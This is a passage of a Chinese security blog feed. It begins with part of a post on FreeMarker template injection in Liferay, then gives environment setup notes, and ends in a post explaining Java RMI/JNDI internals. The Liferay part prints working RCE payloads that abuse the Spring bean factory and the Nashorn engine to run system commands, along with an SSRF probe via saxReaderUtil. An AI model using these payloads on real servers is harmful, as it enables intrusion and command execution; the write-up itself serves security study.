com.liferay.portal.kernel.util.LongWrapper,\</span><br><span class="line">    com.liferay.portal.kernel.util.SubscriptionSender,\</span><br><span class="line">    java.util.GregorianCalendar,\</span><br><span class="line">    java.util.Locale,\</span><br><span class="line">    java.util.TimeZone,\</span><br><span class="line">    sun.util.calendar.ZoneInfo</span><br></pre></td></tr></table></figure><p>很明显到这里好像没有什么新思路了，我们继续探索。</p><h3 id="renderRequest"><a href="#renderRequest" class="headerlink" title="renderRequest"></a>renderRequest</h3><p>然后我们抄一个exp。这就是那个CVE的exp。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;#assign sp=renderRequest.getPortletContext().getServletContext().getContext(<span class="string">&quot;/&quot;</span>).getAttribute(<span class="string">&quot;org.springframework.web.context.WebApplicationContext.ROOT&quot;</span>).getBeanFactory().getBeanDefinition(<span class="string">&quot;com.liferay.document.library.kernel.service.DLAppService&quot;</span>)&gt;</span><br><span class="line">&lt;#assign ec=sp.setScope(<span class="string">&quot;prototype&quot;</span>)&gt;</span><br><span class="line">&lt;#assign eb=sp.setBeanClassName(<span class="string">&quot;jdk.nashorn.api.scripting.NashornScriptEngineFactory&quot;</span>)&gt;</span><br><span class="line">&lt;#assign xx=renderRequest.getPortletContext().getServletContext().getContext(<span class="string">&quot;/&quot;</span>).getAttribute(<span class="string">&quot;org.springframework.web.context.WebApplicationContext.ROOT&quot;</span>).getBeanFactory().registerBeanDefinition(<span class="string">&quot;sp&quot;</span>,sp)&gt;</span><br><span class="line">&lt;#assign res=renderRequest.getPortletContext().getServletContext().getContext(<span class="string">&quot;/&quot;</span>).getAttribute(<span class="string">&quot;org.springframework.web.context.WebApplicationContext.ROOT&quot;</span>).getBeanFactory().getBean(<span class="string">&quot;sp&quot;</span>).getScriptEngine().eval(<span class="string">&quot;var a = new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;cmd&#x27;,&#x27;/c&#x27;,&#x27;whoami&#x27;]);var b=a.start().getInputStream();var c=Java.type(&#x27;com.liferay.portal.kernel.util.StreamUtil&#x27;);var d=new java.io.ByteArrayOutputStream();c.transfer(b,d,1024,false);var e=new java.lang.String(d.toByteArray());e&quot;</span>)&gt;</span><br><span class="line">$&#123;res&#125;</span><br><span class="line"></span><br><span class="line">$&#123;themeDisplayModel.getPortletDisplayModel().getAttributes().getPortletRequest().getContextPath()&#125;</span><br></pre></td></tr></table></figure><p>这里的exp的思路就是<code>renderRequest.getPortletContext().getServletContext().getContext(&quot;/&quot;)</code>通过这一串获取到springboot的ApplicationContext。然后通过ApplicationContext获取PortalApplicationContext，然后获取<code>LiferayBeanFactory</code>.最后用<code>jdk.nashorn.api.scripting.NashornScriptEngineFactory</code>，通过 NashornScriptEngine 调用 eval 执行恶意脚本，触发远程代码执行</p><p>我们也探索出了SSTI中问题的普遍解法，就是找上下文+内建函数。</p><h3 id="saxReaderUtil-xml获取"><a href="#saxReaderUtil-xml获取" class="headerlink" title="saxReaderUtil(xml获取)"></a>saxReaderUtil(xml获取)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">saxReaderUtil.readURL(&quot;http://ip&quot;, false)</span><br></pre></td></tr></table></figure><p>发现这样确实，会收到http请求。猜测一下是不是xml解析。</p><p>报错</p><p><img src="https://c.img.dasctf.com/images/2022520/1653050689561-7475f37f-36be-4304-9bb3-34408894afc5.png" alt="image-20220520204439813"></p><h3 id="Application"><a href="#Application" class="headerlink" title="Application"></a>Application</h3><p><img src="https://c.img.dasctf.com/images/2022520/1653063204473-154b8c4b-3757-44aa-b918-4427b73b2504.png" alt="image-20220521001314802"></p><p>这个类大有作为！</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">this._attributes.get(&quot;CTX&quot;).getContext(&quot;/&quot;).getAttribute(&quot;org.springframework.web.context.WebApplicationContext.ROOT&quot;)</span><br><span class="line">themeDisplayModel.getPortletDisplayModel().getAttributes().get(&quot;CTX&quot;).getContext(&quot;/&quot;).getAttribute(&quot;org.springframework.web.context.WebApplicationContext.ROOT&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;#assign sp=Application[<span class="string">&quot;org.springframework.web.context.WebApplicationContext.ROOT&quot;</span>].getBeanFactory().getBeanDefinition(<span class="string">&quot;com.liferay.document.library.kernel.service.DLAppService&quot;</span>)&gt;</span><br><span class="line">&lt;#assign ec=sp.setScope(<span class="string">&quot;prototype&quot;</span>)&gt;</span><br><span class="line">&lt;#assign eb=sp.setBeanClassName(<span class="string">&quot;jdk.nashorn.api.scripting.NashornScriptEngineFactory&quot;</span>)&gt;</span><br><span class="line">&lt;#assign xx=Application[<span class="string">&quot;org.springframework.web.context.WebApplicationContext.ROOT&quot;</span>].getBeanFactory().registerBeanDefinition(<span class="string">&quot;sp&quot;</span>,sp)&gt;</span><br><span class="line">&lt;#assign res=Application[<span class="string">&quot;org.springframework.web.context.WebApplicationContext.ROOT&quot;</span>].getBeanFactory().getBean(<span class="string">&quot;sp&quot;</span>).getScriptEngine().eval(<span class="string">&quot;var a = new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;cmd&#x27;,&#x27;/c&#x27;,&#x27;whoami&#x27;]);var b=a.start().getInputStream();var c=Java.type(&#x27;com.liferay.portal.kernel.util.StreamUtil&#x27;);var d=new java.io.ByteArrayOutputStream();c.transfer(b,d,1024,false);var e=new java.lang.String(d.toByteArray());e&quot;</span>)&gt;</span><br><span class="line">$&#123;res&#125;</span><br></pre></td></tr></table></figure><p>获取request和reponse的对象后面，然后利用springoot的beanfactory来调用<code>NashornScriptEngineFactory</code>。但是通过黑名单的查看，我们可以发现在进行过那一次大的版本更新之后，黑名单暂时没有增加新的包，暂时如果要在这个框架上面取得突破，必须采取的方法就是最后的部分bypass。这里 主要是寻找到的内建变量来获取这些可以操作的东西。实例化JDK中的 <code>Nashorn</code> 脚本引擎工厂，接着调用 <code>getScriptEngine</code> 获取 <code>Nashorn</code> 引擎实例，再调用 <code>eval</code> 方法来执行脚本。</p><h3 id="TaglibFactory"><a href="#TaglibFactory" class="headerlink" title="TaglibFactory"></a>TaglibFactory</h3><blockquote><p>给模板文件添加内部变量</p></blockquote><h3 id="propsUtil"><a href="#propsUtil" class="headerlink" title="propsUtil"></a>propsUtil</h3><p>可以获取到配置内容，暂时还不知道怎么扩大伤害。</p><h3 id="xmlrequest"><a href="#xmlrequest" class="headerlink" title="xmlrequest"></a>xmlrequest</h3><p><img src="https://c.img.dasctf.com/images/2022523/1653292200154-bd6f1308-696c-4890-a6e5-86ea4634e0a5.png" alt="image-20220523154951015"></p><h3 id="end"><a href="#end" class="headerlink" title="end"></a>end</h3><p>这是在经过了挖掘这些内部对象的利用之后，总结出来的一些可以利用上诉CVE的内置对象，大家可以再深入的学习一下写出自己的exp。其中的<code>imageToolUtil</code>,是可以和Convert进行配合使用来达到RCE的目的，详情可以参照之前的春秋game的<code>picture convert</code>。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="string">&quot;renderRequest&quot;</span> -&gt; &#123;RenderRequestImpl@<span class="number">48541</span>&#125; </span><br><span class="line"> <span class="string">&quot;Application&quot;</span> -&gt; &#123;ServletContextHashModel@<span class="number">48556</span>&#125; </span><br><span class="line"> <span class="string">&quot;Request&quot;</span> -&gt; &#123;HttpRequestHashModel@<span class="number">48727</span>&#125; </span><br><span class="line"> <span class="string">&quot;xmlRequest&quot;</span> -&gt; &#123;TemplateContextHelper$<span class="number">1</span>@<span class="number">48578</span>&#125; </span><br><span class="line"> <span class="string">&quot;company&quot;</span> -&gt; &#123;CompanyImpl@<span class="number">48352</span>&#125;  </span><br><span class="line"><span class="built_in">this</span>.context.get(<span class="string">&quot;portletRequestModelFactory&quot;</span>).getPortletRequestModel().getPortletRequest()</span><br><span class="line">     ===&gt; com.liferay.portlet.internal.RenderRequestImpl@2f03771c  $&#123;portletRequestModelFactory.getPortletRequestModel().getPortletRequest()&#125; </span><br><span class="line"><span class="string">&quot;jsonFactoryUtil&quot;</span> -&gt; &#123;JSONFactoryImpl@<span class="number">48251</span>&#125; </span><br><span class="line"><span class="built_in">this</span>.context.get(<span class="string">&quot;request&quot;</span>).getRequest() == &gt; $&#123;request.getRequest()&#125;</span><br><span class="line">portletConfig.getPortletContext().getServletContext()</span><br><span class="line"><span class="string">&quot;imageToolUtil&quot;</span> -&gt; &#123;ImageToolImpl@<span class="number">48381</span>&#125;  ==&gt; 触发convert</span><br></pre></td></tr></table></figure><h2 id="0x06-环境搭建"><a href="#0x06-环境搭建" class="headerlink" title="0x06 环境搭建"></a>0x06 环境搭建</h2><p>在进行debug环境部署的时候，我碰到了很多的坎坷，在这里给大家分享一下搭建环境的妙招，可以自己接下来进行debug。我使用的环境是<code>IDEA</code>.</p><ul><li><p>首先安装lifeary插件</p></li><li><p>新建项目，随便选择，我自己更喜欢的是Maven，但是Gradle可以使用docker进行debug，也很方便。</p><p><img src="https://c.img.dasctf.com/images/2022529/1653790428284-6ac6db85-b11c-4ad4-86b2-6d863b6ca546.png" alt="image-20220529101339288"></p></li><li><p>进来之后，讲从官网下载的src目录，加入到lib，可以方便debug源码。</p><p><img src="https://c.img.dasctf.com/images/2022529/1653790529157-c97593d8-d15e-464e-9614-a7d629f75453.png" alt="image-20220529101527647"></p></li><li><p>导入之后，初始化本地环境，右键就可以看到。(记得新建的时候选择好自己的版本)</p><p><img src="https://c.img.dasctf.com/images/2022529/1653790573595-b10f7ad9-8089-4b37-90e7-859630e92ce7.png" alt="image-20220529101612719"></p><ul><li><p>最后就可以安心的开发portal和debug源码了。</p><p><img src="https://c.img.dasctf.com/images/2022529/1653790712743-17f490c4-e43e-4856-9080-58caecc84ca3.png" alt="image-20220529101831757"></p></li><li><p>开发模块，直接新建module，开发完成之后，maven&#x3D;&#x3D;&gt;deploy即可。</p><p><img src="https://c.img.dasctf.com/images/2022529/1653790688754-dec48a43-e380-48a3-8390-4e847a994b38.png" alt="image-20220529101804141"></p></li></ul></li></ul><h2 id="0x07-参考资料"><a href="#0x07-参考资料" class="headerlink" title="0x07 参考资料"></a>0x07 参考资料</h2><blockquote><p>参考链接： <a href="https://xz.aliyun.com/t/4846#toc-2">https://xz.aliyun.com/t/4846#toc-2</a></p><p><a href="https://www.anquanke.com/post/id/215348">https://www.anquanke.com/post/id/215348</a></p><p><a href="https://www.freebuf.com/articles/web/287319.html">https://www.freebuf.com/articles/web/287319.html</a></p><p>官方文档：</p><p><a href="https://freemarker.apache.org/docs/index.html">https://freemarker.apache.org/docs/index.html</a></p><p>中文：<a href="http://freemarker.foofun.cn/toc.html">http://freemarker.foofun.cn/toc.html</a></p><p><a href="https://forum.butian.net/share/42">https://forum.butian.net/share/42</a></p></blockquote><h2 id="0x08-总结"><a href="#0x08-总结" class="headerlink" title="0x08 总结"></a>0x08 总结</h2><p><img src="https://c.img.dasctf.com/images/2022610/1654827554227-f41ff2a9-18c3-4e2a-afbf-978c3cb6a465.png" alt="image-20220610101905282"></p><p>  后面会注意文章书写上的一些问题，与君共勉。</p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最后一次再学JNDI</title>
      <link href="/2022/06/01/%E6%9C%80%E5%90%8E%E4%B8%80%E6%AC%A1%E5%86%8D%E8%B0%88JNDI/"/>
      <url>/2022/06/01/%E6%9C%80%E5%90%8E%E4%B8%80%E6%AC%A1%E5%86%8D%E8%B0%88JNDI/</url>
      
        <content type="html"><![CDATA[<h1 id="一文搞懂JNDI"><a href="#一文搞懂JNDI" class="headerlink" title="一文搞懂JNDI"></a>一文搞懂JNDI</h1><blockquote><p>之前一直学，一直忘，这次看到了大哥们的好文章，怒补一下</p></blockquote><h2 id="0x01-RMI"><a href="#0x01-RMI" class="headerlink" title="0x01 RMI"></a>0x01 RMI</h2><p><code>Remote Method Invocation</code> 远程方法调用，构建分布式应用程序，可以实现java跨<code>JVM</code>远程通信</p><ol><li><code>RMI客户端</code>在调用远程方法时会先创建<code>Stub(sun.rmi.registry.RegistryImpl_Stub)</code>。</li><li><code>Stub</code>会将<code>Remote</code>对象传递给<code>远程引用层(java.rmi.server.RemoteRef)</code>并创建<code>java.rmi.server.RemoteCall(远程调用)</code>对象。</li><li><code>RemoteCall</code>序列化<code>RMI服务名称</code>、<code>Remote</code>对象。</li><li><code>RMI客户端</code>的<code>远程引用层</code>传输<code>RemoteCall</code>序列化后的请求信息通过<code>Socket</code>连接的方式传输到<code>RMI服务端</code>的<code>远程引用层</code>。</li><li><code>RMI服务端</code>的<code>远程引用层(sun.rmi.server.UnicastServerRef)</code>收到请求会请求传递给<code>Skeleton(sun.rmi.registry.RegistryImpl_Skel#dispatch)</code>。</li><li><code>Skeleton</code>调用<code>RemoteCall</code>反序列化<code>RMI客户端</code>传过来的序列化。</li><li><code>Skeleton</code>处理客户端请求：<code>bind</code>、<code>list</code>、<code>lookup</code>、<code>rebind</code>、<code>unbind</code>，如果是<code>lookup</code>则查找<code>RMI服务名</code>绑定的接口对象，序列化该对象并通过<code>RemoteCall</code>传输到客户端。</li><li><code>RMI客户端</code>反序列化服务端结果，获取远程对象的引用。</li><li><code>RMI客户端</code>调用远程方法，<code>RMI服务端</code>反射调用<code>RMI服务实现类</code>的对应方法并序列化执行结果返回给客户端。</li><li><code>RMI客户端</code>反序列化<code>RMI</code>远程方法调用结果。</li></ol><p>他的出现就是为了可以实现远程代码调用。换句话说就是，我在客户端调用在服务端的代码，把参数传递给服务端，他返回结果给我。</p><blockquote><p>RMI原理分析： <a href="https://www.bilibili.com/video/BV1zP4y1s7Cj?p=2&amp;spm_id_from=pageDriver">https://www.bilibili.com/video/BV1zP4y1s7Cj?p=2&amp;spm_id_from=pageDriver</a></p><p><a href="https://blog.csdn.net/huxiang19851114/article/details/112991261">https://blog.csdn.net/huxiang19851114/article/details/112991261</a></p><p><a href="https://xz.aliyun.com/t/8644#toc-4">https://xz.aliyun.com/t/8644#toc-4</a></p><p>攻击rmi:<a href="https://github.com/qtc-de/remote-method-guesser">https://github.com/qtc-de/remote-method-guesser</a></p></blockquote><h3 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h3><blockquote><p>env: jdk8u181</p></blockquote><h4 id="server"><a href="#server" class="headerlink" title="server"></a>server</h4><p>有一点点类似于c语言的头文件和源文件，所以我们必须首先声明一个接口</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * RMI的接口 必须要 继承Remote</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ICalc</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">sum</span><span class="params">(List&lt;Integer&gt; params)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现这个接口</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.dem0.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">ICalc</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">baseNumber</span> <span class="operator">=</span> <span class="number">123</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">Calc</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">sum</span><span class="params">(List&lt;Integer&gt; params)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">sum</span> <span class="operator">=</span> baseNumber;</span><br><span class="line">        <span class="keyword">for</span> (Integer param : params) &#123;</span><br><span class="line">            sum += param;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Registry"><a href="#Registry" class="headerlink" title="Registry"></a>Registry</h4><p>开始注册。这里的注册有两种方法。一种是使用<code>LocateRegistry.createRegistry</code>来建立一个Registry，并且挂载在<code>calc</code>路径上，也可以使用静态方法<code>Naming.bind(&quot;url&quot;,class)</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RegCalc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, MalformedURLException &#123;</span><br><span class="line">        <span class="type">ICalc</span> <span class="variable">calc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Calc</span>();</span><br><span class="line">        Naming.bind(<span class="string">&quot;rmi://127.0.0.1:9999&quot;</span>,calc);</span><br><span class="line"><span class="comment">//        Registry registry = LocateRegistry.createRegistry(9999);</span></span><br><span class="line"><span class="comment">//        registry.rebind(&quot;calc&quot;,calc);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="client"><a href="#client" class="headerlink" title="client"></a>client</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;192.168.59.1&quot;</span>, <span class="number">9999</span>);</span><br><span class="line"><span class="type">ICalc</span> <span class="variable">calc</span> <span class="operator">=</span> (ICalc) registry.lookup(<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure><p>通过<code>getRegistry</code>获得<code>registry</code>对象，然后lookup拿到绑定在方法上的方法。</p><h4 id="发生了什么"><a href="#发生了什么" class="headerlink" title="发生了什么"></a>发生了什么</h4><p><img src="https://img.dem0dem0.top/images/image-20220429213739245.png" alt="image-20220429213739245"></p><p><img src="https://img.dem0dem0.top/images/image-20220429215535116.png" alt="image-20220429215535116"></p><p><img src="https://img.dem0dem0.top/images/image-20220429215545259.png" alt="image-20220429215545259"></p><p>按照上面图中的分析来讲，</p><h4 id="server-amp-register"><a href="#server-amp-register" class="headerlink" title="server &amp; register"></a>server &amp; register</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">9999</span>);</span><br><span class="line"><span class="comment">//        registry.rebind(&quot;calc&quot;,calc);</span></span><br></pre></td></tr></table></figure><p>这两句一个是register的，一个server的代码。但是一般来说这二者都在一个服务器上面所以就不再展开分析了。我们首先来debug一下。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">new Calc();</span><br></pre></td></tr></table></figure><p><img src="https://img.dem0dem0.top/images/image-20220430164810885.png" alt="image-20220430164810885"></p><p>他的<code>ref</code>属性是UnicastServerRef(RemoteRef).然后调用他的exportObject方法.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote var1, Object var2, <span class="type">boolean</span> var3)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">var4</span> <span class="operator">=</span> var1.getClass();</span><br><span class="line">        Remote var5;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//根据class对象生成代理对象，用来服务于客户端RegistryImpl的Stub对象,这里是Calc的代理对象，后面也是一样的</span></span><br><span class="line">            var5 = Util.createProxy(var4, <span class="built_in">this</span>.getClientRef(), <span class="built_in">this</span>.forceStubUse);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException var7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExportException</span>(<span class="string">&quot;remote object implements illegal remote interface&quot;</span>, var7);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (var5 <span class="keyword">instanceof</span> RemoteStub) &#123;</span><br><span class="line">            <span class="built_in">this</span>.setSkeleton(var1);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//封装proxy</span></span><br><span class="line">        <span class="type">Target</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Target</span>(var1, <span class="built_in">this</span>, var5, <span class="built_in">this</span>.ref.getObjID(), var3);</span><br><span class="line">    <span class="comment">//发布proxy</span></span><br><span class="line">        <span class="built_in">this</span>.ref.exportObject(var6);</span><br><span class="line">        <span class="built_in">this</span>.hashToMethod_Map = (Map)hashToMethod_Maps.get(var4);</span><br><span class="line">        <span class="keyword">return</span> var5;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>UnicastServerRef</code>最顶层的也是<code>Remote</code>,<code>LiveRef</code>是对于socket交流的封装。</p><p>因为我们在实现接口的时候，继承了<code>UnicastRemoteObject</code>,所以我们在new的时候会调用父类的构造方法</p><p><img src="https://img.dem0dem0.top/images/image-20220430090358259.png" alt="image-20220430090358259"></p><p>会自动地帮忙<code>exportObject</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Creates and exports a new UnicastRemoteObject object using the particular supplied port.</span><br></pre></td></tr></table></figure><p>所以会随机用一个port导出这个类(会生成objectiD(唯一))。现在我们才能说这个远程类可以被导出了。也就完成了这一步。</p><p><img src="https://img.dem0dem0.top/images/image-20220430090625044.png" alt="image-20220430090625044"></p><p>接下来就是注册中心create了，这部分不多说。然后就是<code>bind</code>了，实现的方式也很简单，<code>this.bindings(private Hashtable&lt;String, Remote&gt;)</code>.</p><p><img src="https://img.dem0dem0.top/images/image-20220430091000720.png" alt="image-20220430091000720"></p><p>确实就是接口名字，endpoint和objid。现在服务端和register都准备好了，开始看client端了。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">9999</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="title function_">RegistryImpl</span><span class="params">(<span class="keyword">final</span> <span class="type">int</span> var1)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="built_in">this</span>.bindings = <span class="keyword">new</span> <span class="title class_">Hashtable</span>(<span class="number">101</span>);</span><br><span class="line">    <span class="keyword">if</span> (var1 == <span class="number">1099</span> &amp;&amp; System.getSecurityManager() != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedExceptionAction</span>&lt;Void&gt;() &#123;</span><br><span class="line">                <span class="keyword">public</span> Void <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">                    <span class="type">LiveRef</span> <span class="variable">var1x</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LiveRef</span>(RegistryImpl.id, var1);</span><br><span class="line">                    RegistryImpl.<span class="built_in">this</span>.setup(<span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(var1x, (var0) -&gt; &#123;</span><br><span class="line">                        <span class="keyword">return</span> RegistryImpl.registryFilter(var0);</span><br><span class="line">                    &#125;));</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;, (AccessControlContext)<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">SocketPermission</span>(<span class="string">&quot;localhost:&quot;</span> + var1, <span class="string">&quot;listen,accept&quot;</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (PrivilegedActionException var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (RemoteException)var3.getException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">LiveRef</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, var1);</span><br><span class="line">        <span class="built_in">this</span>.setup(<span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(var2, RegistryImpl::registryFilter));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键代码<code>this.setup(new UnicastServerRef(var2, RegistryImpl::registryFilter));</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">setup</span><span class="params">(UnicastServerRef var1)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="comment">//将指向正在初始化的RegistryImpl对象的远程引用ref（RemoteRef）赋值为传入的UnicastServerRef对象，这里涉及了向上转型（后续会用到LiveRef）</span></span><br><span class="line">        <span class="built_in">this</span>.ref = var1;</span><br><span class="line">    <span class="comment">//然后又会调用到上面的exportObject</span></span><br><span class="line">    <span class="comment">// this 获取RegistryImpl的class对象--Skeleton类型</span></span><br><span class="line">        var1.exportObject(<span class="built_in">this</span>, (Object)<span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>到现在来说，我们进行的还只是一些变量赋值的操作，都没有进行传输层上的业务，但是追溯<code>LiveRef(传输层的封装)</code>的exportObject()方法，很容易找到了TCPTransport的exportObject()方法。这个方法做的事情就是将上面构造的Target对象暴露出去。调用TCPTransport的listen()方法，listen()方法创建了一个ServerSocket，并且启动了一条线程等待客户端的请求。接着调用父类Transport的exportObject()将Target对象存放进ObjectTable中。</p><h4 id="client-1"><a href="#client-1" class="headerlink" title="client"></a>client</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;192.168.59.1&quot;</span>, <span class="number">9999</span>);</span><br></pre></td></tr></table></figure><p>追踪下去</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">LiveRef</span> <span class="variable">liveRef</span> <span class="operator">=</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">LiveRef</span>(<span class="keyword">new</span> <span class="title class_">ObjID</span>(ObjID.REGISTRY_ID),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port, csf, <span class="literal">null</span>),</span><br><span class="line">                        <span class="literal">false</span>);</span><br><span class="line">        <span class="type">RemoteRef</span> <span class="variable">ref</span> <span class="operator">=</span></span><br><span class="line">            (csf == <span class="literal">null</span>) ? <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(liveRef) : <span class="keyword">new</span> <span class="title class_">UnicastRef2</span>(liveRef);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (Registry) Util.createProxy(RegistryImpl.class, ref, <span class="literal">false</span>);<span class="comment">//客户端有了服务端的RegistryImpl的代理</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ICalc calc = (ICalc) registry.lookup(&quot;calc&quot;);</span><br></pre></td></tr></table></figure><p>调用<code>registerimpl#lookup</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Remote <span class="title function_">lookup</span><span class="params">(String var1)</span> <span class="keyword">throws</span> AccessException, NotBoundException, RemoteException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//newCall()方法做的事情简单来看就是建立了跟远程RegistryImpl的Skeleton对象的连接</span></span><br><span class="line">            <span class="type">RemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="built_in">this</span>.ref.newCall(<span class="built_in">this</span>, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">                var3.writeObject(var1);</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="comment">//ref UnicastRef（子类;UnicastServerRef） ===&gt; 使用socket发送</span></span><br><span class="line">            <span class="built_in">this</span>.ref.invoke(var2);</span><br><span class="line">            Remote var22;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ObjectInput</span> <span class="variable">var4</span> <span class="operator">=</span> var2.getInputStream();</span><br><span class="line">                var22 = (Remote)var4.readObject();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var14) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling return&quot;</span>, var14);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException var15) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span 